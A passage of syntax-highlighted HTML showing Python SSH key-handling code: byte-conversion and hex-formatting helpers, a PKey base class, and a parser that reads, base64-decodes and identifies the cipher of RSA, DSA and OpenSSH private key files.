(adapted from Crypto.Util.number)&quot;</span></span><br><span class="line">    <span class="comment"># after much testing, this algorithm was deemed to be the fastest</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    n = long(n)</span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">0</span>) <span class="keyword">and</span> (n != <span class="number">-1</span>):</span><br><span class="line">        s = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, n &amp; <span class="number">0xffffffff</span>) + s</span><br><span class="line">        n = n &gt;&gt; <span class="number">32</span></span><br><span class="line">    <span class="comment"># strip off leading zeros, FFs</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enumerate(s):</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">and</span> (i[<span class="number">1</span>] != <span class="string">&#x27;\000&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">-1</span>) <span class="keyword">and</span> (i[<span class="number">1</span>] != <span class="string">&#x27;\xff&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># degenerate case, n was either 0 or -1</span></span><br><span class="line">        i = (<span class="number">0</span>,)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            s = <span class="string">&#x27;\000&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">    s = s[i[<span class="number">0</span>]:]</span><br><span class="line">    <span class="keyword">if</span> add_sign_padding:</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &gt;= <span class="number">0x80</span>):</span><br><span class="line">            s = <span class="string">&#x27;\x00&#x27;</span> + s</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">-1</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &lt; <span class="number">0x80</span>):</span><br><span class="line">            s = <span class="string">&#x27;\xff&#x27;</span> + s</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary_weird</span>(<span class="params">data</span>):</span></span><br><span class="line">    out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enumerate(data):</span><br><span class="line">        out += <span class="string">&#x27;%02X&#x27;</span> % ord(i[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] % <span class="number">2</span>:</span><br><span class="line">            out += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] % <span class="number">16</span> == <span class="number">15</span>:</span><br><span class="line">            out += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary</span>(<span class="params">data, prefix=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> len(data) &gt; x + <span class="number">16</span>:</span><br><span class="line">        out.append(format_binary_line(data[x:x + <span class="number">16</span>]))</span><br><span class="line">        x += <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; len(data):</span><br><span class="line">        out.append(format_binary_line(data[x:]))</span><br><span class="line">    <span class="keyword">return</span> [prefix + y <span class="keyword">for</span> y <span class="keyword">in</span> out]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary_line</span>(<span class="params">data</span>):</span></span><br><span class="line">    left = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;%02X&#x27;</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line">    right = <span class="string">&#x27;&#x27;</span>.join([(<span class="string">&#x27;.%c..&#x27;</span> % c)[(ord(c) + <span class="number">63</span>) // <span class="number">95</span>] <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%-50s %s&#x27;</span> % (left, right)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexify</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hexlify(s).upper()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unhexify</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> unhexlify(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_string</span>(<span class="params">s</span>):</span></span><br><span class="line">    out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> (ord(c) &gt;= <span class="number">32</span>) <span class="keyword">and</span> (ord(c) &lt;= <span class="number">127</span>):</span><br><span class="line">            out += c</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out += <span class="string">&#x27;%%%02X&#x27;</span> % ord(c)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit_length</span>(<span class="params">n</span>):</span></span><br><span class="line">    norm = deflate_long(n, <span class="number">0</span>)</span><br><span class="line">    hbyte = ord(norm[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> hbyte == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    bitlen = len(norm) * <span class="number">8</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (hbyte &amp; <span class="number">0x80</span>):</span><br><span class="line">        hbyte &lt;&lt;= <span class="number">1</span></span><br><span class="line">        bitlen -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> bitlen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tb_strings</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(traceback.format_exception(*sys.exc_info())).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key_bytes</span>(<span class="params">hashclass, salt, key, nbytes</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Given a password, passphrase, or other human-source key, scramble it</span></span><br><span class="line"><span class="string">    through a secure hash into some keyworthy bytes.  This specific algorithm</span></span><br><span class="line"><span class="string">    is used for encrypting/decrypting private key files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @param hashclass: class from L&#123;Crypto.Hash&#125; that can be used as a secure</span></span><br><span class="line"><span class="string">        hashing function (like C&#123;MD5&#125; or C&#123;SHA&#125;).</span></span><br><span class="line"><span class="string">    @type hashclass: L&#123;Crypto.Hash&#125;</span></span><br><span class="line"><span class="string">    @param salt: data to salt the hash with.</span></span><br><span class="line"><span class="string">    @type salt: string</span></span><br><span class="line"><span class="string">    @param key: human-entered password or passphrase.</span></span><br><span class="line"><span class="string">    @type key: string</span></span><br><span class="line"><span class="string">    @param nbytes: number of bytes to generate.</span></span><br><span class="line"><span class="string">    @type nbytes: int</span></span><br><span class="line"><span class="string">    @return: key data</span></span><br><span class="line"><span class="string">    @rtype: string</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    keydata = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    digest = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> len(salt) &gt; <span class="number">8</span>:</span><br><span class="line">        salt = salt[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">while</span> nbytes &gt; <span class="number">0</span>:</span><br><span class="line">        hash_obj = hashclass()</span><br><span class="line">        <span class="keyword">if</span> len(digest) &gt; <span class="number">0</span>:</span><br><span class="line">            hash_obj.update(digest)</span><br><span class="line">        hash_obj.update(key)</span><br><span class="line">        hash_obj.update(salt)</span><br><span class="line">        digest = hash_obj.digest()</span><br><span class="line">        size = min(nbytes, len(digest))</span><br><span class="line">        keydata += digest[:size]</span><br><span class="line">        nbytes -= size</span><br><span class="line">    <span class="keyword">return</span> keydata</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Common API for all public keys.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PKey</span> (<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Base class for public keys.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># known encryption types for private key files:</span></span><br><span class="line">    _CIPHER_TABLE = &#123;</span><br><span class="line">        <span class="string">&#x27;AES-128-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: AES, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;mode&#x27;</span>: AES.MODE_CBC&#125;,</span><br><span class="line">        <span class="string">&#x27;DES-EDE3-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: DES3, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;mode&#x27;</span>: DES3.MODE_CBC&#125;,</span><br><span class="line">        <span class="string">&#x27;AES-256-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: AES, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">32</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;mode&#x27;</span>: AES.MODE_CBC&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, msg=None, data=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a new instance of this public key type.  If C&#123;msg&#125; is given,</span></span><br><span class="line"><span class="string">        the key&#x27;s public part(s) will be filled in from the message.  If</span></span><br><span class="line"><span class="string">        C&#123;data&#125; is given, the key&#x27;s public part(s) will be filled in from</span></span><br><span class="line"><span class="string">        the string.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param msg: an optional SSH L&#123;Message&#125; containing a public key of this</span></span><br><span class="line"><span class="string">        type.</span></span><br><span class="line"><span class="string">        @type msg: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        @param data: an optional string containing a public key of this type</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise SSHException: if a key cannot be created from the C&#123;data&#125; or</span></span><br><span class="line"><span class="string">        C&#123;msg&#125; given, or no key was passed in.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return a string of an SSH L&#123;Message&#125; made up of the public part(s) of</span></span><br><span class="line"><span class="string">        this key.  This string is suitable for passing to L&#123;__init__&#125; to</span></span><br><span class="line"><span class="string">        re-create the key object later.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: string representation of an SSH key message.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__cmp__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Compare this key to another.  Returns 0 if this key is equivalent to</span></span><br><span class="line"><span class="string">        the given key, or non-0 if they are different.  Only the public parts</span></span><br><span class="line"><span class="string">        of the key are compared, so a public key will compare equal to its</span></span><br><span class="line"><span class="string">        corresponding private key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param other: key to compare to.</span></span><br><span class="line"><span class="string">        @type other: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string">        @return: 0 if the two keys are equivalent, non-0 otherwise.</span></span><br><span class="line"><span class="string">        @rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hs = hash(self)</span><br><span class="line">        ho = hash(other)</span><br><span class="line">        <span class="keyword">if</span> hs != ho:</span><br><span class="line">            <span class="keyword">return</span> cmp(hs, ho)</span><br><span class="line">        <span class="keyword">return</span> cmp(str(self), str(other))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return the name of this private key implementation.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: name of this private key type, in SSH terminology (for</span></span><br><span class="line"><span class="string">        example, C&#123;&quot;ssh-rsa&quot;&#125;).</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bits</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return the number of significant bits in this key.  This is useful</span></span><br><span class="line"><span class="string">        for judging the relative security of a key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: bits in the key.</span></span><br><span class="line"><span class="string">        @rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">can_sign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return C&#123;True&#125; if this key has the private part necessary for signing</span></span><br><span class="line"><span class="string">        data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: C&#123;True&#125; if this is a private key.</span></span><br><span class="line"><span class="string">        @rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_fingerprint</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return an MD5 fingerprint of the public part of this key.  Nothing</span></span><br><span class="line"><span class="string">        secret is revealed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: a 16-byte string (binary) of the MD5 fingerprint, in SSH</span></span><br><span class="line"><span class="string">            format.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> MD5.new(str(self)).digest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_base64</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return a base64 string containing the public part of this key.  Nothing</span></span><br><span class="line"><span class="string">        secret is revealed.  This format is compatible with that used to store</span></span><br><span class="line"><span class="string">        public key files or recognized host keys.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: a base64 string containing the public part of the key.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> base64.encodestring(str(self)).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign_ssh_data</span>(<span class="params">self, rng, data</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Sign a blob of data with this private key, and return a L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        representing an SSH signature message.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param rng: a secure random number generator.</span></span><br><span class="line"><span class="string">        @type rng: L&#123;Crypto.Util.rng.RandomPool&#125;</span></span><br><span class="line"><span class="string">        @param data: the data to sign.</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string">        @return: an SSH signature message.</span></span><br><span class="line"><span class="string">        @rtype: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_ssh_sig</span>(<span class="params">self, data, msg</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Given a blob of data, and an SSH message representing a signature of</span></span><br><span class="line"><span class="string">        that data, verify that it was signed with this key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param data: the data that was signed.</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string">        @param msg: an SSH signature message</span></span><br><span class="line"><span class="string">        @type msg: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        @return: C&#123;True&#125; if the signature verifies correctly; C&#123;False&#125;</span></span><br><span class="line"><span class="string">            otherwise.</span></span><br><span class="line"><span class="string">        @rtype: boolean</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_private_key_file</span>(<span class="params">cls, filename, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a key object by reading a private key file.  If the private</span></span><br><span class="line"><span class="string">        key is encrypted and C&#123;password&#125; is not C&#123;None&#125;, the given password</span></span><br><span class="line"><span class="string">        will be used to decrypt the key (otherwise L&#123;PasswordRequiredException&#125;</span></span><br><span class="line"><span class="string">        is thrown).  Through the magic of python, this factory method will</span></span><br><span class="line"><span class="string">        exist in all subclasses of PKey (such as L&#123;RSAKey&#125; or L&#123;DSSKey&#125;), but</span></span><br><span class="line"><span class="string">        is useless on the abstract PKey class.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param filename: name of the file to read</span></span><br><span class="line"><span class="string">        @type filename: str</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key file,</span></span><br><span class="line"><span class="string">            if it&#x27;s encrypted</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: a new key object based on the given private key</span></span><br><span class="line"><span class="string">        @rtype: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the file</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is</span></span><br><span class="line"><span class="string">            encrypted, and C&#123;password&#125; is C&#123;None&#125;</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = cls(filename=filename, password=password)</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line">    from_private_key_file = classmethod(from_private_key_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_private_key</span>(<span class="params">cls, file_obj, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a key object by reading a private key from a file (or file-like)</span></span><br><span class="line"><span class="string">        object.  If the private key is encrypted and C&#123;password&#125; is not C&#123;None&#125;,</span></span><br><span class="line"><span class="string">        the given password will be used to decrypt the key (otherwise</span></span><br><span class="line"><span class="string">        L&#123;PasswordRequiredException&#125; is thrown).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param file_obj: the file to read from</span></span><br><span class="line"><span class="string">        @type file_obj: file</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key, if it&#x27;s</span></span><br><span class="line"><span class="string">            encrypted</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: a new key object based on the given private key</span></span><br><span class="line"><span class="string">        @rtype: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the key</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is encrypted,</span></span><br><span class="line"><span class="string">            and C&#123;password&#125; is C&#123;None&#125;</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = cls(file_obj=file_obj, password=password)</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line">    from_private_key = classmethod(from_private_key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_read_private_key_file</span>(<span class="params">self, tag, filename, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Read an SSH2-format private key file, looking for a string of the type</span></span><br><span class="line"><span class="string">        C&#123;&quot;BEGIN xxx PRIVATE KEY&quot;&#125; for some C&#123;xxx&#125;, base64-decode the text we</span></span><br><span class="line"><span class="string">        find, and return it as a string.  If the private key is encrypted and</span></span><br><span class="line"><span class="string">        C&#123;password&#125; is not C&#123;None&#125;, the given password will be used to decrypt</span></span><br><span class="line"><span class="string">        the key (otherwise L&#123;PasswordRequiredException&#125; is thrown).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param tag: C&#123;&quot;RSA&quot;&#125; or C&#123;&quot;DSA&quot;&#125;, the tag used to mark the data block.</span></span><br><span class="line"><span class="string">        @type tag: str</span></span><br><span class="line"><span class="string">        @param filename: name of the file to read.</span></span><br><span class="line"><span class="string">        @type filename: str</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key file,</span></span><br><span class="line"><span class="string">            if it&#x27;s encrypted.</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: data blob that makes up the private key.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the file.</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is</span></span><br><span class="line"><span class="string">            encrypted, and C&#123;password&#125; is C&#123;None&#125;.</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = open(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % str(e))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        data = self._read_private_key(tag, f, password)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_read_private_key</span>(<span class="params">self, tag, f, password=None</span>):</span></span><br><span class="line">        lines = f.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;BEGIN RSA PRIVATE&quot;</span> <span class="keyword">in</span> lines[<span class="number">0</span>]:</span><br><span class="line">            tag = <span class="string">&quot;RSA&quot;</span></span><br><span class="line">            self.type = <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----&quot;</span> <span class="keyword">in</span> lines[<span class="number">0</span>]:</span><br><span class="line">            <span class="comment"># new private key format for OpenSSH (automatically enabled for</span></span><br><span class="line">            <span class="comment"># keys using ed25519 signatures), ed25519 stuff is not supported</span></span><br><span class="line">            <span class="comment"># yet!</span></span><br><span class="line">            self.type = <span class="number">2</span>  <span class="comment"># bcrypt pbkdf + aes-256-cbc</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.type = <span class="number">1</span></span><br><span class="line">            tag = <span class="string">&quot;DSA&quot;</span></span><br><span class="line"></span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt; len(lines)) <span class="keyword">and</span> ((lines[start].strip() != <span class="string">&#x27;-----BEGIN &#x27;</span> + tag + <span class="string">&#x27; PRIVATE KEY-----&#x27;</span>) <span class="keyword">and</span> (lines[start].strip() != <span class="string">&#x27;-----BEGIN OPENSSH PRIVATE KEY-----&#x27;</span>)):</span><br><span class="line">            start += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> start &gt;= len(lines):</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s is not a valid private key file\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># parse any headers first</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; len(lines):</span><br><span class="line">            l = lines[start].split(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> len(l) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            headers[l[<span class="number">0</span>].lower()] = l[<span class="number">1</span>].strip()</span><br><span class="line">            start += <span class="number">1</span></span><br><span class="line">        <span class="comment"># find end</span></span><br><span class="line">        end = start</span><br><span class="line">        <span class="keyword">while</span> ((lines[end].strip() != <span class="string">&#x27;-----END OPENSSH PRIVATE KEY-----&#x27;</span>) <span class="keyword">and</span> (lines[end].strip() != <span class="string">&#x27;-----END &#x27;</span> + tag + <span class="string">&#x27; PRIVATE KEY-----&#x27;</span>)) <span class="keyword">and</span> (end &lt; len(lines)):</span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line">        <span class="comment"># if we trudged to the end of the file, just try to cope.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="string">&#x27;&#x27;</span>.join(lines[start:end]).encode()</span><br><span class="line">            data = base64.decodestring(data)</span><br><span class="line">        <span class="keyword">except</span> base64.binascii.Error:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;base64 decoding error: &#x27;</span> + str(e))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;proc-type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers <span class="keyword">and</span> self.type != <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># unencryped: done</span></span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># encrypted keyfile: will need a password</span></span><br><span class="line">        <span class="keyword">if</span> self.type != <span class="number">2</span> <span class="keyword">and</span> headers[<span class="string">&#x27;proc-type&#x27;</span>] != <span class="string">&#x27;4,ENCRYPTED&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unknown private key structure &quot;%s&quot;&#x27;</span> % headers[<span class="string">&#x27;proc-type&#x27;</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            encryption_type, saltstr = headers[<span class="string">&#x27;dek-info&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type != <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Can\&#x27;t parse DEK-info in private key file&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                encryption_type = <span class="string">&quot;AES-256-CBC&quot;</span></span><br><span class="line">                saltstr = <span class="string">&quot;fefe&quot;</span></span><br><span class="line">        <span class="keyword">if</span> encryption_type <span class="keyword">not</span> <span class="keyword">in</span> self._CIPHER_TABLE:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unknown private key cipher &quot;%s&quot;&#x27;</span> % encryption_type)</span><br><span class="line">        <span class="comment"># if no password was passed in, raise an exception pointing out that we need one</span></span><br><span class="line">        <span class="keyword">if</span> password <span 